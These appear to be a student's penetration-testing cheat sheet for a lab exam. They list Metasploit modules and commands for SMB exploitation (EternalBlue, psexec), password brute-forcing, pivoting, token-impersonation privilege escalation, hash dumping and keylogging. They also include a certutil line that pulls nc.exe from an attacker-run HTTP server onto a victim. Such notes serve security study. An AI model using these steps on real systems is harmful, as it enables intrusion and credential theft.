# smb
* check for login
  * smb_login
    * can also use hash file in place of password file
  * smb_protocol
* anon
* enum shares,users
  * enum4linux
    * enum4linux -a target2.ine.local
      * Accessible share -> write allowed
  * smbwalk
  * smb_enumusers(msf)
  * smb_enumshares(msf)
* can use users to get passwords via hydra or crackmapexec
* psexec module get a meterpreter shell. ps. might have to change the payload
* eternal blue
  * eternal_blue check module(smb_ms17_010)
* crackmapexec smb <IP>
  * Find the local system architecture
* samba
  * v3.5.0 vuln to RCE
  * is_known_pipename

# .cgi page
* shellshock
* get a reverse tcp shell

# ftp
* use searchsploit
* if it holds web files, then those files can be overwritten with a shell of our choice
  * multi/handler can be used to get a reverse shell

# switching machines/Pivoting
* meterpreter session
* add autoroute -s <IP>/subnet
  * use ipconfig to get the net mask
  * can run scanner/portscan
  * can port forward with `portfwd add -l <localport> -r <new_victime_ip(use the ip)> -p <victim service port>`
    * with this we can db_nmap our localhost port 
    * for this we need windows/meterpreter/bind_tcp
  * for using any other module, we just need to use the normal stuff, since the target is already linked via autoroute
    * needs to ensure new ports are selected when selecting a payload

# SNMP enum
* identify enabled devices
* look for community strings
* `snmpwalk`
* It's run over smb

# Priv escalation
* meterpreter session
* getprivs
* load incognito
* list_tokens -u
  * SeImpersonatePrivilege -> getsystem
  * SeImpersonateToken -> impersonate_token "<root>"
* can use win_privs to decide on next step
  * if UAC is enabled -> bypassuac_injection -> getsystem
* for linux, look for processes run by the root
  * if its a normal cron job, add ur self to sudoers
  * if its some specific file like chkrootkit use msf

# Meterpreter shell
* shell-to-meterpreter
* sessions -u <no.>

# ssh
* hydra to crack passwords
* ssh_login
  * creds from hydra can be used to open a session on msf
* libssh_auth_bypass

# SMTP
* harak is vuln before 2.8.9

# http
* IIS Httpd 7
  * supports various extensions including asp -> asp files can be executed
  * run nmap scripts or brute force with hydra
* HttpFileServer httpd 2.3 -> rejetto
* badblue
* use dirb to enumerate
  * xdebug enabled -> meterpreter
* http-enum
* check online for default creds

# meterpreter
* help -> lists available commands
* `search -d /usr/bin -f *ckdo*`
* windows/x64/meterpreter/reverse_tcp
* windows/meterpreter/reverse_tcp
* ps -S explorer.exe -> migrate <>
* dumphash -> can be used to get hashes
  * psexec can be used to authenticate with these hashes
* keyscan_start
  * migrate to explorer and start and stop it to make it work

# RDP
* port 3389
* enable_rdp

# banner grabbing
* banner nse script

# netcat
* copy binary onto host machine via simple http server
  * `python -m SimpleHTTPServer 80`
  * `certutil -urlcache -f http://<IP>/nc.exe nc.exe`

# wp
* nmap --script http-wordpress-enum --script-args host=<host>
* wordpress plugins in the wp-content/plugins folder
  * do a normal dirb search first

# windows server
* eternal blue

# linux write files
* find / -type f -writable 2>/dev/null

exploitdb/rapid7